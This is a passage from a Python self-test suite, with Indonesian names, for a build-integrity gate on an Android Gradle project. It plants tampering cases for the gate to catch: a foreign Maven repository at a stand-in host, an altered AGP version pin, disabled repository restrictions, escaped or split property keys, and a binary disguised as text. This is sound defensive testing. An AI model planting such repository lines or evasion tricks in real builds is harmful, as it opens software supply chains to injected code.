        rc, out = jalan(tplchar, [sys.executable, GERBANG, "--semua"])
        periksa("template berisi char petik di settings sehat: gerbang lolos (Audit 877)",
                rc == 0)
        shutil.rmtree(tplchar, ignore_errors=True)

        tplagp = klon(tmp, "tplagp")
        berkas_agp3 = os.path.join(tplagp, "build.gradle.kts")
        with open(berkas_agp3, encoding="utf-8") as f:
            isi_agp3 = f.read()
        with open(berkas_agp3, "w", encoding="utf-8") as f:
            f.write('val penanda = "${\'"\'}"\n'
                    '/* id("com.android.application") version'
                    ' "8.13.2" apply false */\n'
                    + isi_agp3.replace('version "8.13.2"',
                                       'version "9.9.9"'))
        rc, out = jalan(tplagp, [sys.executable, GERBANG, "--semua"])
        periksa("template char petik + AGP di komentar: gerbang gagal (Audit 877)",
                rc != 0 and "8.13.2" in out)
        shutil.rmtree(tplagp, ignore_errors=True)

        tplkomen = klon(tmp, "tplkomen")
        berkas_set10 = os.path.join(tplkomen, "settings.gradle.kts")
        with open(berkas_set10, encoding="utf-8") as f:
            isi_set10 = f.read()
        with open(berkas_set10, "w", encoding="utf-8") as f:
            f.write('val penanda = "${x /* " */ + y}"\n' + isi_set10)
        rc, out = jalan(tplkomen, [sys.executable, GERBANG, "--semua"])
        periksa("komentar berisi petik di dalam template settings sehat: gerbang lolos (Audit 880)",
                rc == 0)
        shutil.rmtree(tplkomen, ignore_errors=True)

        tplraw = klon(tmp, "tplraw")
        berkas_set11 = os.path.join(tplraw, "settings.gradle.kts")
        with open(berkas_set11, encoding="utf-8") as f:
            isi_set11 = f.read()
        with open(berkas_set11, "w", encoding="utf-8") as f:
            f.write('val penanda = "${"""a"b"""}"\n' + isi_set11)
        rc, out = jalan(tplraw, [sys.executable, GERBANG, "--semua"])
        periksa("raw string berpetik di dalam template settings sehat: gerbang lolos (Audit 883)",
                rc == 0)
        shutil.rmtree(tplraw, ignore_errors=True)

        strmode = klon(tmp, "strmode")
        berkas_set6 = os.path.join(strmode, "settings.gradle.kts")
        with open(berkas_set6, encoding="utf-8") as f:
            isi_set6 = f.read()
        with open(berkas_set6, "w", encoding="utf-8") as f:
            f.write(isi_set6.replace(
                "    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)",
                "    // repositoriesMode dimatikan\n"
                '    val penanda = "RepositoriesMode.FAIL_ON_PROJECT_REPOS"'))
        rc, out = jalan(strmode, [sys.executable, GERBANG, "--semua"])
        periksa("mode hanya di dalam string biasa: gerbang gagal (Audit 869)",
                rc != 0 and "FAIL_ON_PROJECT_REPOS" in out)
        shutil.rmtree(strmode, ignore_errors=True)

        rawmode = klon(tmp, "rawmode")
        berkas_set7 = os.path.join(rawmode, "settings.gradle.kts")
        with open(berkas_set7, encoding="utf-8") as f:
            isi_set7 = f.read()
        with open(berkas_set7, "w", encoding="utf-8") as f:
            f.write(isi_set7.replace(
                "    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)",
                "    // repositoriesMode dimatikan\n"
                '    val penanda = """RepositoriesMode.FAIL_ON_PROJECT_REPOS"""'))
        rc, out = jalan(rawmode, [sys.executable, GERBANG, "--semua"])
        periksa("mode hanya di dalam raw string: gerbang gagal (Audit 869)",
                rc != 0 and "FAIL_ON_PROJECT_REPOS" in out)
        shutil.rmtree(rawmode, ignore_errors=True)

        rawagp = klon(tmp, "rawagp")
        berkas_agp = os.path.join(rawagp, "build.gradle.kts")
        with open(berkas_agp, encoding="utf-8") as f:
            isi_agp = f.read()
        with open(berkas_agp, "w", encoding="utf-8") as f:
            f.write(isi_agp.replace('version "8.13.2"', 'version "9.9.9"')
                    + '\nval penanda = """id("com.android.application")'
                      ' version "8.13.2" apply false"""\n')
        rc, out = jalan(rawagp, [sys.executable, GERBANG, "--semua"])
        periksa("versi AGP terpaku hanya di raw string: gerbang gagal (Audit 869)",
                rc != 0 and "8.13.2" in out)
        shutil.rmtree(rawagp, ignore_errors=True)

        komen = klon(tmp, "komen")
        berkas_set3 = os.path.join(komen, "settings.gradle.kts")
        with open(berkas_set3, encoding="utf-8") as f:
            isi_set3 = f.read()
        with open(berkas_set3, "w", encoding="utf-8") as f:
            f.write(isi_set3.replace(
                "repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)",
                "// repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)"))
        rc, out = jalan(komen, [sys.executable, GERBANG, "--semua"])
        periksa("baris repositoriesMode dikomentari: gerbang gagal (Audit 854)",
                rc != 0 and "FAIL_ON_PROJECT_REPOS" in out)
        shutil.rmtree(komen, ignore_errors=True)

        selip = klon(tmp, "selip")
        berkas_set4 = os.path.join(selip, "settings.gradle.kts")
        with open(berkas_set4, encoding="utf-8") as f:
            isi_set4 = f.read()
        with open(berkas_set4, "w", encoding="utf-8") as f:
            f.write(isi_set4.replace(
                "    repositories {\n        google()\n        mavenCentral()\n    }\n}\nrootProject",
                "    repositories /* dicoba */ { maven { url = uri(\"https://repo-asing.example.com/\") } }\n}\nrootProject"))
        rc, out = jalan(selip, [sys.executable, GERBANG, "--semua"])
        periksa("repo asing terselip komentar blok: gerbang gagal (Audit 854)",
                rc != 0 and "maven" in out)
        shutil.rmtree(selip, ignore_errors=True)

        ganda = klon(tmp, "ganda")
        berkas_prop = os.path.join(ganda, "gradle.properties")
        with open(berkas_prop, "a", encoding="utf-8") as f:
            f.write("android.useAndroidX=true\n")
        rc, out = jalan(ganda, [sys.executable, GERBANG, "--semua"])
        periksa("useAndroidX duplikat last-wins true: gerbang gagal (Audit 854)",
                rc != 0 and "useAndroidX" in out)
        shutil.rmtree(ganda, ignore_errors=True)

        titikdua = klon(tmp, "titikdua")
        berkas_prop2 = os.path.join(titikdua, "gradle.properties")
        with open(berkas_prop2, "a", encoding="utf-8") as f:
            f.write("android.useAndroidX:true\n")
        rc, out = jalan(titikdua, [sys.executable, GERBANG, "--semua"])
        periksa("useAndroidX pemisah titik dua last-wins: gerbang gagal (Audit 871)",
                rc != 0 and "useAndroidX" in out)
        shutil.rmtree(titikdua, ignore_errors=True)

        sambung = klon(tmp, "sambung")
        berkas_prop3 = os.path.join(sambung, "gradle.properties")
        with open(berkas_prop3, "a", encoding="utf-8") as f:
            f.write("android.useAndroidX\\\n=true\n")
        rc, out = jalan(sambung, [sys.executable, GERBANG, "--semua"])
        periksa("useAndroidX sambung-baris belah kunci: gerbang gagal (Audit 876)",
                rc != 0 and "useAndroidX" in out)
        shutil.rmtree(sambung, ignore_errors=True)

        esckunci = klon(tmp, "esckunci")
        with open(os.path.join(esckunci, "gradle.properties"), "a",
                  encoding="utf-8") as f:
            f.write("android.useAndroid\\u0058=true\n")
        rc, out = jalan(esckunci, [sys.executable, GERBANG, "--semua"])
        periksa("useAndroidX escape unicode di kunci: gerbang gagal (Audit 879)",
                rc != 0 and "useAndroidX" in out)
        shutil.rmtree(esckunci, ignore_errors=True)

        escpisah = klon(tmp, "escpisah")
        with open(os.path.join(escpisah, "gradle.properties"), "a",
                  encoding="utf-8") as f:
            f.write("android.useAndroidX\\u003dtrue\n")
        rc, out = jalan(escpisah, [sys.executable, GERBANG, "--semua"])
        periksa("useAndroidX escape unicode di pemisah: gerbang gagal (Audit 879)",
                rc != 0 and "useAndroidX" in out)
        shutil.rmtree(escpisah, ignore_errors=True)

        agp = klon(tmp, "agp")
        berkas_akar = os.path.join(agp, "build.gradle.kts")
        with open(berkas_akar, encoding="utf-8") as f:
            isi_akar = f.read()
        with open(berkas_akar, "w", encoding="utf-8") as f:
            f.write(isi_akar.replace('version "8.13.2"', 'version "9.9.9"'))
        rc, out = jalan(agp, [sys.executable, GERBANG, "--semua"])
        periksa("versi AGP diganti dari terpaku: gerbang gagal (Audit 835)",
                rc != 0 and "8.13.2" in out)
        shutil.rmtree(agp, ignore_errors=True)

        asing = klon(tmp, "asing")
        berkas_set2 = os.path.join(asing, "settings.gradle.kts")
        with open(berkas_set2, encoding="utf-8") as f:
            isi_set2 = f.read()
        with open(berkas_set2, "w", encoding="utf-8") as f:
            f.write(isi_set2.replace(
                "        google()\n        mavenCentral()\n    }\n}\nrootProject",
                "        google()\n        mavenCentral()\n"
                "        maven { url = uri(\"https://repo-asing.example.com/\") }\n"
                "    }\n}\nrootProject"))
        rc, out = jalan(asing, [sys.executable, GERBANG, "--semua"])
        periksa("repositori asing di settings: gerbang gagal (Audit 835)",
                rc != 0 and "maven" in out)
        shutil.rmtree(asing, ignore_errors=True)

        yatim = klon(tmp, "yatim")
        berkas_yatim = os.path.join(yatim, "app", "src", "main", "res",
                                    "layout-land", "yatimuji.xml")
        with open(berkas_yatim, "w") as f:
            f.write("<LinearLayout xmlns:android="
                    "\"http://schemas.android.com/apk/res/android\" />\n")
        rc, out = jalan(yatim, [sys.executable, GERBANG, "--semua"])
        periksa("layout-land yatim: gerbang gagal (Audit 831)",
                rc != 0 and "layout-land" in out)
        shutil.rmtree(yatim, ignore_errors=True)

        nyamar = klon(tmp, "nyamar")
        with open(os.path.join(nyamar, "catatan-uji.txt"), "wb") as f:
            f.write(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 16)
        git(nyamar, "add", "-A")
        git(nyamar, "commit", "-q", "-m", "tanam biner menyamar")
        rc, out = jalan(nyamar, [sys.executable, GERBANG,
                                "--rentang", "HEAD~1..HEAD"])
        periksa("biner menyamar sebagai teks: gerbang gagal (Audit 831)",
                rc != 0 and "catatan-uji.txt" in out)
        shutil.rmtree(nyamar, ignore_errors=True)

        bersih2 = klon(tmp, "bersih2")
        rc, out = jalan(bersih2,
                        [sys.executable, GERBANG,
                         "app/src/main/java/com/tasirin/vaultwardenhost/"
                         "BerkasNgawur.java"])
        periksa("jalur eksplisit tak ada: gerbang gagal (Audit 829)",
                rc != 0 and "BerkasNgawur.java" in out)

    if GAGAL:
        print("GAGAL: %d skenario menyimpang: %s"
              % (len(GAGAL), ", ".join(GAGAL)))
        return 1
    print("LOLOS: semua skenario uji-diri gerbang sesuai harapan.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
